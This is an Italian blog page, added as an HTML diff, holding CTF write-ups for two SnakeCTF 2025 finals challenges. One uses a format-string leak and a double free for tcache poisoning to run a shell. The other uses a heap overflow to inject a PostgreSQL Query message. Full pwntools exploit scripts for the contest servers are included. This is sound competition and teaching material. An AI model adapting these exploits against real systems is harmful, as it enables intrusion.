@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="it" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Finali SnakeCTF 2025 | Portfolio</title>
+<meta name="keywords" content="finals, ctf, pwn, reverse, snakectf">
+<meta name="description" content="I writeup di tutte le challenge che ho risolto durante le Finali SnakeCTF 2025.">
+<meta name="author" content="AlBovo">
+<link rel="canonical" href="https://albovo.github.io/en/ctf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d6fcd20a4fb86efa4dfac8ec95da60244cc8871042183da1ef28e3a762ad79c8.css" integrity="sha256-1vzSCk&#43;4bvpN&#43;sjsldpgJEzIhxBCGD2h7yjjp2Ktecg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://albovo.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://albovo.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://albovo.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://albovo.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://albovo.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://albovo.github.io/en/ctf/snakefinals2025/">
+<link rel="alternate" hreflang="it" href="https://albovo.github.io/it/ctf/snakefinals2025/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<meta property="og:url" content="https://albovo.github.io/it/ctf/snakefinals2025/">
+  <meta property="og:site_name" content="Portfolio">
+  <meta property="og:title" content="Finali SnakeCTF 2025">
+  <meta property="og:description" content="I writeup di tutte le challenge che ho risolto durante le Finali SnakeCTF 2025.">
+  <meta property="og:locale" content="it">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="ctf">
+    <meta property="article:published_time" content="2025-12-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-12-08T00:00:00+00:00">
+    <meta property="article:tag" content="Finals">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Reverse">
+    <meta property="article:tag" content="Snakectf">
+    <meta property="og:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups">
+<meta name="twitter:title" content="Finali SnakeCTF 2025">
+<meta name="twitter:description" content="I writeup di tutte le challenge che ho risolto durante le Finali SnakeCTF 2025.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Capture The Flag 🚩",
+      "item": "https://albovo.github.io/it/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Finali SnakeCTF 2025",
+      "item": "https://albovo.github.io/it/ctf/snakefinals2025/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Finali SnakeCTF 2025",
+  "name": "Finali SnakeCTF 2025",
+  "description": "I writeup di tutte le challenge che ho risolto durante le Finali SnakeCTF 2025.",
+  "keywords": [
+    "finals", "ctf", "pwn", "reverse", "snakectf"
+  ],
+  "articleBody": "Finali SnakeCTF 2025 🐍 Prima di entrare nelle soluzioni delle due challenge su cui ho lavorato con @Gabrain24 e @Renny, voglio dire quanto mi sono divertito a giocare questa CTF. È stato davvero molto divertente, e condividere l’esperienza con i miei compagni e amici del team pwnthem0le l’ha resa ancora migliore.\nShellcode Wannabe Shellcode Wannabe era un semplice binario ELF per x86_64 scritto in C, che forniva all’utente quattro azioni principali:\nCreate uno shellcode, allocando 0x400 byte sull’heap in un mapping di memoria RW.\nDelete uno shellcode, liberando la chunk allocata durante la creazione.\nEdit uno shellcode, sovrascrivendone i byte.\nExecute lo shellcode, letteralmente chiamandolo:\nmov rdx, [rbp+s] mov eax, 0 call rdx Prima che il servizio partisse effettivamente, la challenge invocava la funzione initialize_challenge, implementata come segue:\n__int64 initialize_challenge() { unsigned int v0; __int64 result; int i; setbuf(stdout, 0); setbuf(stdin, 0); setbuf(stderr, 0); v0 = time(0); srand(v0); menu(); for ( i = 0; i \u003c= 15; ++i ) secret[i] = rand() % 26 + 65; shellcode = (__int64)mmap(0, 0x400u, 7, 34, -1, 0); // RWX memory result = shellcode; if ( shellcode == -1 ) { perror(\"mmap\"); exit(1); } return result; } Questa configurazione era interessante perché, come detto, la challenge ci consentiva di scrivere solo in una regione di memoria Read-Write, il che significava che non potevamo eseguire direttamente il nostro codice iniettato. Di conseguenza, per ottenere la flag era prima necessario leakare l’indirizzo dello shellcode e poi ottenere una qualche forma di arbitrary write su quel mapping RWX.\nQuesto era possibile grazie a più vulnerabilità presenti nella challenge, tra cui:\nDouble free, il comando delete non controllava mai se un puntatore fosse già stato liberato. Printf vulnerability, a ogni iterazione la challenge stampava la versione disassemblata dello shellcode usando capstone. Durante questo processo validava una secret di 16 byte (usata come sanity check sulla memoria dello shellcode) e, solo quando lo shellcode era esattamente lungo 992 byte, aggiungeva una stringa di 32 byte alla fine del disassemblato. Questa stringa iniziava con il secret e terminava con 16 byte che potevano essere facilmente sovrascritti una volta conosciuta il secret. char *__fastcall print_assembly(__int64 a1, int a2) { ... v3 = a2; v14 = __readfsqword(0x28u); *(_QWORD *)format = 0; v12 = 0; memset(s, 0, 0xFFF0u); v9 = (char *)malloc(0x10000u); if ( a2 \u003e 992 ) v3 = 992; if ( strncmp((const char *)(a1 + 992), secret, 0x10u) ) return 0; if ( (unsigned int)cs_open(3, 8, \u0026v5) ) return 0; v10 = cs_disasm(v5, a1, v3, 4096, 0, \u0026v6); if ( v10 ) { v7 = 0; for ( i = 0; i \u003c v10; ++i ) { v4 = snprintf( \u0026format[v7], 0x100u, \"0x%lx:\\t%s\\t\\t%s\\n\", *(_QWORD *)(v6 + 240 * i + 8), (const char *)(v6 + 240 * i + 34), (const char *)(v6 + 240 * i + 66)); if ( v4 \u003c 0 ) return 0; if ( (unsigned __int64)(v4 + v7) \u003e 0xFFFF ) return 0; v7 += v4; } if ( v3 == 992 ) // only when 992 bytes long memcpy(\u0026format[v7], (const void *)(a1 + 992), 0x20u); // 32 bytes snprintf(v9, 0x10000u, format); // printf vulnerability cs_free(v6, v10); } else { puts(\"ERROR: Failed to disassemble given code!\"); } cs_close(\u0026v5); return v9; } Tenendo questo a mente, il primo passo è stato leakare il secret.\nSi è rivelato piuttosto semplice: scrivendo uno shellcode di 992 byte composto interamente da istruzioni nop, la challenge avrebbe leakato il secret come parte del disassemblato. Una volta leakata, potevamo sovrascriverla per andare in overflow nei 16 byte successivi, come spiegato sopra.\nUsando questa primitive siamo riusciti a leakare praticamente tutto ciò che ci serviva, inclusi:\nL’indirizzo di main. Un indirizzo casuale dell’heap. Da questi leak abbiamo ricavato sia il base address PIE dell’eseguibile principale, sia la base della regione heap.\nA questo punto, i passi rimanenti erano leakare l’indirizzo della regione RWX (possibile grazie al leak del PIE e quindi dell’indirizzo .bss del puntatore allo shellcode) e poi forzare malloc a restituire proprio quel puntatore.\n.bss:0000000000202050 public secret .bss:0000000000202050 ; char secret[] .bss:0000000000202050 secret dq ? ; DATA XREF: initialize_challenge+96↑o .bss:0000000000202050 ; print_assembly+8F↑o ... .bss:0000000000202058 qword_202058 dq ? ; DATA XREF: main+173↑r .bss:0000000000202060 public shellcode .bss:0000000000202060 shellcode dq ? ; DATA XREF: initialize_challenge+CF↑w .bss:0000000000202060 ; initialize_challenge+D6↑r .bss:0000000000202060 _bss ends Per leakare la regione RWX è stato necessario usare di nuovo la primitive di printf, ma con un po’ di attenzione: l’indirizzo era allineato a 64 bit, il che significava che la presenza di un byte nullo iniziale faceva fallire printf. Questo dettaglio piuttosto sottile mi è costato circa un’ora di debugging durante la CTF.\nUna volta ottenuti tutti i leak, l’ultimo passo era ottenere un arbitrary write sulla regione RWX. L’approccio è stato:\nDelete di uno shellcode, lasciando una chunk freed nella memoria della challenge. Edit dello stesso shellcode, sovrascrivendo il puntatore fwd della chunk freed (tcache, dato che la size era piccola) in modo che puntasse alla regione RWX. Create di due nuovi shellcode; la seconda allocazione restituiva un puntatore all’interno della regione RWX, permettendoci di scrivere un classico bash shellcode, che abbiamo poi eseguito per ottenere la flag remota. Se ti interessa l’exploit che ho sviluppato, eccolo qui (è un po’ orribile tbh):\n#!/usr/bin/env python3 from pwn import * TOKEN = \"XXXXXXXXXXXXXXXXXXXXXXXXXXXX\" exe = ELF(\"./chall_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-linux-x86-64.so.2\") context.binary = exe context.terminal = ('tmux', 'splitw', '-h') def conn(): if args.GDB: return gdb.debug([exe.path], gdbscript=\"\"\" b *print_assembly+656 b *main+598 c \"\"\") return remote(\"shellcode-wannabe.challs.snakectf.org\", 1337, ssl=True) def main(): r = conn() if not args.GDB: r.sendlineafter(b\": \", TOKEN.encode()) r.sendlineafter(b\": \", b\"create\") r.sendlineafter(b\": \", b\"create\") r.sendlineafter(b\": \", b\"edit\") r.sendafter(b\": \", asm(\"nop\")*992) r.sendlineafter(b\": \", b\"delete\") for _ in range(992): r.recvline() secret = r.recvline().strip() print(secret) r.sendlineafter(b\": \", b\"create\") r.sendlineafter(b\": \", b\"edit\") r.sendlineafter(b\": \", asm(\"nop\")*992 + secret + b\"%p%8209$p\") for _ in range(993): r.recvline() f = r.recvline()[16:].decode().strip() for _ in range(992): r.recvline() data = r.recvline().decode().strip() f = int(data[16:31], 16) f1 = int(data[30:], 16) - 0x136c exe.address = f1 - exe.sym[\"main\"] r.sendlineafter(b\": \", b\"delete\") print(f\"leak heap: {hex(f)}\") print(f\"leak base addr exe: {hex(exe.address)}\") r.sendlineafter(b\": \", b\"create\") r.sendlineafter(b\": \", b\"edit\") r.sendafter(b\": \", asm(\"nop\")*992 + secret + b\"%1753$sA\" + p64(exe.address + 0x202060 + 4861 + 1)) for _ in range(993 + 994): r.recvline() data = b'\\0' + r.recvline().strip()[16:][:5].ljust(7, b\"\\x00\") print(len(data)) r.sendlineafter(b\": \", b\"delete\") for _ in range(992): r.recvline() # inizio double free r.sendlineafter(b\": \", b\"edit\") r.sendafter(b\": \", data) for _ in range(992): r.recvline() log.info(\"Leak: \" + hex(u64(data))) log.info(\"Orig: \" + hex(exe.address + 0x202060 + 4861)) log.info(\"F: \" + hex(f)) r.sendlineafter(b\": \", b\"create\") r.sendlineafter(b\": \", b\"create\") r.sendlineafter(b\": \", b\"edit\") r.sendlineafter(b\": \", asm(shellcraft.sh())) r.interactive() if __name__ == \"__main__\": main() PG Slop Notes 🔥 Questa challenge è stata davvero una bomba. @Renny ed io ci siamo divertiti così tanto a risolverla che, dopo un po’, abbiamo smesso di preoccuparci della scoreboard e volevamo solo continuare a giocare con il binario.\nIl servizio esponeva un’interfaccia “sloppy” verso un database PostgreSQL remoto. Il binario in sé era solo un client: si connetteva a un DB remoto e permetteva all’utente di interagirci tramite un semplice menu:\nvoid __cdecl menu() { puts(\"1 \u003e New note\"); puts(\"2 \u003e Search note by ID\"); puts(\"3 \u003e Search note by owner\"); puts(\"4 \u003e Edit note\"); puts(\"5 \u003e Delete note\"); puts(\"6 \u003e Exit\"); } Dal lato remoto, lo schema del database era il seguente:\ncreate table notes ( id serial primary key, content text not null, created_at timestamp default current_timestamp, owner varchar(64) not null, secret_key varchar(16) not null ); create table flags ( flag varchar(128) primary key ); insert into flags (flag) values ('snakeCTF{placeholder}'); La flag era salvata in una tabella dedicata flags, e nessuna delle funzioni “normali” del programma la toccava mai: non c’era nessuna opzione del menu che facesse riferimento a flags. Quindi l’unico modo realistico per recuperare la flag era in qualche modo manomettere l’SQL inviato, oppure abusare direttamente del wire protocol di PostgreSQL.\nLa particolarità interessante era che il binario non usava i semplici messaggi Query del protocollo, ma sfruttava l’extended query protocol di PostgreSQL, costruendo messaggi come Bind, Describe, Execute e Sync, che venivano poi inviati come un unico buffer combinato sul socket.\nLa funzione pg_conn_run_prepared_stmt era responsabile dell’invio di uno prepared statement e dei relativi parametri. Internamente creava quattro messaggi in questo ordine:\nun messaggio Bind che prendeva uno prepared statement e alcuni parametri e li trasformava in un portal, un messaggio Describe per ottenere i metadati del portal o dello statement, un messaggio Execute per eseguire effettivamente il portal, e un ultimo messaggio Sync per flushare tutto e riportare il server in uno stato consistente. Tutti e quattro i messaggi venivano poi serializzati in un unico buffer contiguo sull’heap e scritti sul socket con una singola send().\nIl messaggio Bind è quello che conta di più per l’exploit, perché è il punto in cui i dati controllati dall’utente (content della nota, owner, secret key) vengono impacchettati nel protocollo.\nLa sua struttura, semplificata, è più o meno questa. Prima c’è un header con il tipo di messaggio ('B'), la lunghezza complessiva, il nome del portal e il nome dello statement:\n+--------+-----------------------+------------------------------+-------------------------------+ | 1 byte | 4 bytes | variable | variable | | 'B' | length (Int32) | portal name (String, C-str) | statement name (String) | +--------+-----------------------+------------------------------+-------------------------------+ ^ length includes everything from here to the end Poi arrivano i format dei parametri, i valori dei parametri e i format del risultato. La parte chiave per noi è come vengono codificati i parametri: per ogni parametro c’è un campo di lunghezza a 4 byte seguito da quel numero di byte, oppure -1 se il parametro è NULL.\nGli altri messaggi (Describe, Execute, Sync) sono relativamente semplici:\nDescribe contiene un flag di tipo (“statement” o “portal”) e un nome. Execute contiene il nome del portal e un max-row count. Sync è sostanzialmente un messaggio di dimensione fissa che dice “flush tutto”. La cosa importante non sono tanto le loro semantiche, quanto il fatto che tutti vengono scritti in un singolo buffer dopo il Bind. Il layout in memoria è quindi:\n[ Bind ][ Describe ][ Execute ][ Sync ] Se riusciamo a far calcolare male la dimensione del messaggio Bind, possiamo andare in overflow sui messaggi successivi.\nLa funzionalità “New note” ci dava esattamente la primitive di cui avevamo bisogno. L’handler per la creazione di una nuova nota leggeva il content dallo stdin usando read() e poi lo usava come primo parametro per lo prepared statement insert_note.\nIl codice era questo:\nprintf(\"Content: \"); len = read(0, content_buf, 0x1FFu); // 511 bytes max if ( len ) { content_buf[len] = 0; content_buf[strcspn(content_buf, \"\\n\")] = 0; printf(\"Owner: \"); fgets(owner, 64, stdin); owner[strcspn(owner, \"\\n\")] = 0; gen_random_secret_key(secret_key, 0x11u); secret_key[16] = 0; params[0].value = content_buf; params[0].length = len; // uses length as returned by read() params[1].value = owner; params[1].length = strlen(owner); params[2].value = secret_key; params[2].length = 16; result = pg_conn_run_prepared_stmt(conn, \"insert_note\", 3u, params); if ( result \u0026\u0026 result-\u003erow_count \u003e 0 ) printf( \"Note created with ID: %.*s.\\nUse secret key %.16s to edit/delete.\\n\", ***result-\u003erows, (**result-\u003erows + 4LL), secret_key); else puts(\"Failed to create note\"); pg_query_result_free(result); } else { puts(\"Invalid content length.\"); } La sottigliezza sta in params[0].length = len;. Quel len è il valore di ritorno di read(), che conta i byte grezzi, inclusi eventuali \\0 nel mezzo dell’input.\nPiù avanti, quando viene costruito il messaggio Bind, la funzione pg_msg_get_size viene usata per calcolare quanto grande sarà il messaggio. Questa dimensione viene poi usata per allocare il buffer sull’heap che conterrà i messaggi Bind + Describe + Execute + Sync. Tuttavia pg_msg_get_size usa strlen() sui valori dei parametri invece dei campi di lunghezza espliciti.\nL’implementazione di pg_msg_get_size per Bind è (semplificando) la seguente:\npg_msg_get_size(msg) { param_sizes = 0; for ( i = 0; i \u003c *(msg + 12); ++i ) param_sizes += strlen(*(*(8LL * i + *(msg + 4)) + 8LL)) + 4; v1 = strlen(*(msg + 1)); // statement name return v1 + strlen(*(msg + 2)) + param_sizes + 13; } Quindi la dimensione del messaggio Bind viene calcolata sommando strlen(parameter_value) + 4 per ogni parametro. Se il nostro content contiene un byte nullo in mezzo, strlen() si ferma a quel byte e vede una stringa più corta rispetto a quella che abbiamo effettivamente fornito.\nConsidera un input del tipo:\n\"AAAA\\x00AAAA\\n\" La read() vede 10 byte: quattro A, un \\0, altre quattro A e un newline. Quindi len = 10. Il programma sostituisce il newline con un null terminator, ma la stringa contiene ancora il primo \\0 in mezzo. Se chiami strlen(content_buf) ottieni solo 4, perché si ferma al primo \\0.\nQuesto crea un mismatch:\nLa struttura del parametro per Bind dice “length = 10”. Il calcolo della dimensione del Bind, usando strlen(), dice “questo parametro ha 4 byte di dati”. L’allocazione sull’heap per i messaggi combinati usa pg_msg_get_size(bind_msg) con la dimensione più corta, quindi il buffer allocato è troppo piccolo per i dati che verranno copiati in seguito.\nIl colpo di grazia è il codice che serializza effettivamente i parametri del Bind nel buffer. Ricalcola vlen con strlen(), ma poi usa il campo .length (preso da read()) come size per la copia:\nfor ( i = 0; i \u003c msg-\u003eparam_count; ++i ) { vlen = strlen(msg-\u003eparam_values[i]-\u003evalue); // short length *(int32_t *)\u0026buffer[offset] = htonl(vlen); // this is what is encoded into the message offsetb = offset + 4; memcpy(\u0026buffer[offsetb], msg-\u003eparam_values[i]-\u003evalue, msg-\u003eparam_values[i]-\u003elength); // copies full read() length offset = vlen + offsetb; // advances only by vlen, not by copied bytes } In altre parole, il serializer del Bind:\ndice a PostgreSQL “ci sono vlen byte di dati per il parametro”, in realtà scrive nel buffer length byte controllati dall’utente, che possono essere più grandi di vlen, e poi avanza l’offset come se avesse scritto solo vlen byte. Dato che anche il buffer sull’heap è stato dimensionato usando strlen(), la combinazione di questi errori porta a un heap buffer overflow: i dati controllati dall’utente dal Bind traboccano oltre la fine di dove il messaggio Bind avrebbe dovuto fermarsi.\nTorniamo ora a pg_conn_run_prepared_stmt. Dopo aver calcolato tutte le dimensioni, alloca un unico buffer:\nbind_msg_size = pg_msg_get_size(bind_msg); describe_msg_size = pg_msg_get_size(describe_msg); execute_msg_size = pg_msg_get_size(execute_msg); total = execute_msg_size + describe_msg_size + bind_msg_size + pg_msg_get_size(sync_msg); buf = malloc(total); Poi serializza ciascun messaggio nella posizione corretta:\nsync_msg_size = pg_msg_serialize_to(sync_msg, \u0026buf[execute_msg_size + describe_msg_size + bind_msg_size]); execute_msg_sizea = pg_msg_serialize_to(execute_msg, \u0026buf[describe_msg_size + bind_msg_size]); describe_msg_sizea = pg_msg_serialize_to(describe_msg, \u0026buf[bind_msg_size]); bind_msg_sizea = pg_msg_serialize_to(bind_msg, buf); Quindi il layout previsto è:\nbuf: [ Bind ][ Describe ][ Execute ][ Sync ] Tuttavia, la serializzazione del Bind scrive più byte di bind_msg_size a causa del mismatch sulla lunghezza. Questo significa che i dati del Bind vanno in overflow sulla porzione che avrebbe dovuto contenere i messaggi Describe, Execute e Sync.\nDal nostro punto di vista, questa è una primitive molto potente: controlliamo ora una parte di memoria che verrà inviata tale e quale sulla rete dopo un Bind valido. Scegliendo con cura il contenuto dell’overflow, possiamo sovrascrivere i messaggi successivi con byte arbitrari del protocollo.\nAncora meglio, mettendo il byte nullo all’inizio del content della nota, facciamo in modo che strlen(content_buf) sia praticamente zero pur avendo fino a 510 byte letti da read(). Questo massimizza la differenza tra la dimensione “dichiarata” e i dati effettivamente scritti, dandoci una grossa area da sovrascrivere.\nAlla fine, invece del layout originale:\n+---+---+---+---+ | B | D | E | S | (intended) +---+---+---+---+ otteniamo di fatto:\n+---+-----------+ | B | Q-crafted | (what we actually send) +---+-----------+ Il Bind resta valido, ma il resto dello stream diventa ciò che abbiamo iniettato noi. In particolare, possiamo scrivere un messaggio Query ('Q') con SQL arbitrario.\nAbbiamo ancora bisogno di un modo per farci tornare il risultato della query malevola. Qui entra in gioco la logica di stampa della “New note”.\nDopo che pg_conn_run_prepared_stmt ritorna, la funzione controlla il risultato e, se almeno una row è stata restituita, stampa un ID come stringa:\nresult = pg_conn_run_prepared_stmt(conn, \"insert_note\", 3u, params); if ( result \u0026\u0026 result-\u003erow_count \u003e 0 ) printf( \"Note created with ID: %.*s.\\nUse secret key %.16s to edit/delete.\\n\", ***result-\u003erows, (**result-\u003erows + 4LL), secret_key); else puts(\"Failed to create note\"); L’indicizzazione dentro result-\u003erows è un po’ brutta, ma l’idea è semplice: prende la prima colonna della prima row e la stampa come stringa. In condizioni normali, lo prepared statement che inserisce una nota restituirebbe l’id della nuova nota, e il programma mostrerebbe qualcosa tipo “Note created with ID: 42”.\nTuttavia, dato che abbiamo sovrascritto i messaggi successivi con il nostro messaggio Query, possiamo invece eseguire una query del tipo:\nSELECT flag FROM flags; Il server eseguirà quella query e invierà indietro una row contenente la flag. Il client, convinto di ricevere il risultato di insert_note, tratterà il primo field della row come il “note ID” e lo stamperà. La stringa che appare al posto dell’ID è in realtà la flag.\nQuindi, la catena completa è:\nusare il bug di gestione dell’input per creare un grosso mismatch tra read() e strlen(), sfruttare questo mismatch per fare overflow dal messaggio Bind nella zona dove dovrebbero trovarsi Describe, Execute e Sync, sovrascrivere quella zona con un messaggio Query valido che esegue un SELECT sulla flag, e lasciare che la normale routine di stampa mostri il risultato della nostra query malevola come fosse l’ID della nota. L’unica parte davvero delicata è costruire correttamente i byte del protocollo in modo che, dopo il Bind, il server veda un messaggio Q ben formato con la lunghezza giusta e la stringa SQL corretta. Una volta fatto, il leak è diretto.\nExploit Durante la CTF abbiamo scritto un exploit in Python un po’ sporco che ricreava il messaggio Bind, inseriva con attenzione un \\0 all’inizio del content della nota e poi sfruttava il conseguente overflow per sovrascrivere il resto del buffer inviato con un messaggio Query costruito a mano. Il codice dell’exploit non è particolarmente elegante, ma era abbastanza affidabile per dumpare la flag, quindi lo abbiamo lasciato così com’era.\nUna volta capito che il messaggio Bind veniva sottodimensionato ma copiava comunque tutti i byte ritornati da read(), tutto è andato al suo posto: potevamo rompere i messaggi di protocollo successivi e iniettare la nostra query SQL. Il fatto che il client poi stampasse la prima colonna della prima row come stringa ci ha fornito il canale di esfiltrazione perfetto, e la flag è tornata indietro travestita da “note ID”.\nIn generale è stata una challenge davvero divertente, e un’ottima scusa per sporcarci le mani con l’extended query protocol di PostgreSQL.\n#!/usr/bin/env python3 from pwn import * exe = ELF(\"./chall_patched\") context.binary = exe context.terminal = (\"tmux\", \"splitw\", \"-h\") def conn(): if args.LOCAL: r = process([exe.path], env={\"PGPASSWORD\": \"postgres\"}, aslr=False) gdb.attach(r, gdbscript=\"\" \\ # \"b * pg_conn_send if *(unsigned char*)$rsi == 0x42 || *(unsigned char*)$rsi == 0x51\\n\" \\ \"b *pg_bind_msg_serialize_to\") else: r = remote(\"f4dba05dc6e4eb22899e88cc0e710ea6.pg-slop-notes.challs.snakectf.org\", 1337, ssl=True) return r def q(r): r.recvuntil(b': ') def new_note(r, content, owner): r.recvlines(6) r.recvuntil(b'\u003e ') r.sendline(b'1') q(r) r.sendline(content) q(r) r.sendline(owner) return def query(sql, size=None): query_bytes = sql.encode('utf-8') + b'\\x00' length = 4 + len(query_bytes) return b'Q' + struct.pack('!I', size if size else length) + query_bytes def stat_query(sql, size=None): query_bytes = sql.encode('utf-8') + b'\\x00' length = 4 + len(query_bytes) return b'P' + struct.pack('!I', size if size else length) + query_bytes + b'\\0'*3 def describe_stmt(name=''): n = name.encode('utf-8') + b'\\x00' return b'D' + struct.pack('!I', 5 + len(n)) + b'S' + n def execute_all(portal=''): p = portal.encode('utf-8') + b'\\x00' return b'E' + struct.pack('!I', 8 + len(p)) + p + b'\\x00\\x00\\x00\\x00' def sync_msg(): return b'S\\x00\\x00\\x00\\x04' def main(): r = conn() new_note(r, \"ciao\", \"ciao\") q = b'MERDA'*10 + b'\\0' + b'A'*30 + query(\"select flag from flags;\") print(new_note(r, q, b\"alice\")) try: r.interactive() except KeyboardInterrupt: print(\"lol\") if __name__ == \"__main__\": main() Conclusioni Anche se siamo arrivati ottavi in classifica generale, ho intenzione (o almeno spero) di partecipare di nuovo l’anno prossimo a questa bella CTF (magari per vincere 😎).\n",
+  "wordCount" : "3271",
+  "inLanguage": "it",
+  "image":"https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups","datePublished": "2025-12-08T00:00:00Z",
+  "dateModified": "2025-12-08T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "AlBovo"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://albovo.github.io/it/ctf/snakefinals2025/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Portfolio",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://albovo.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://albovo.github.io/it/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://albovo.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="https://albovo.github.io/en/" title="🇬🇧 En"
+                            aria-label=":uk: En">🇬🇧 En</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://albovo.github.io/it/projects/" title="📒 Progetti">
+                    <span>📒 Progetti</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://albovo.github.io/it/ctf/" title="⚙ Writeups">
+                    <span>⚙ Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://albovo.github.io/it/aoc/" title="🎄 Advent of Code">
+                    <span>🎄 Advent of Code</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://albovo.github.io/it/competitions/" title="🏆 Competizioni">
+                    <span>🏆 Competizioni</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://albovo.github.io/it/">Home</a>&nbsp;»&nbsp;<a href="https://albovo.github.io/it/ctf/">Capture The Flag 🚩</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Finali SnakeCTF 2025
+    </h1>
+    <div class="post-description">
+      I writeup di tutte le challenge che ho risolto durante le Finali SnakeCTF 2025.
+    </div>
+    <div class="post-meta"><span title='2025-12-08 00:00:00 +0000 UTC'>dicembre 8, 2025</span>&nbsp;·&nbsp;16 minuti&nbsp;·&nbsp;3271 parole&nbsp;·&nbsp;AlBovo&nbsp;|&nbsp;Traduzioni:
+<ul class="i18n_list">
+    <li>
+        <a href="https://albovo.github.io/en/ctf/snakefinals2025/">🇬🇧 En</a>
+    </li>
+</ul>&nbsp;|&nbsp;<a href="https://github.com/AlBovo/AlBovo.github.io/blob/main/content/en/ctf/snakefinals2025.md" rel="noopener noreferrer" target="_blank">Suggerisci modifiche</a>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Indice contenuti</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#shellcode-wannabe">Shellcode Wannabe</a></li>
+    <li><a href="#pg-slop-notes-">PG Slop Notes 🔥</a>
+      <ul>
+        <li><a href="#exploit">Exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusioni">Conclusioni</a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
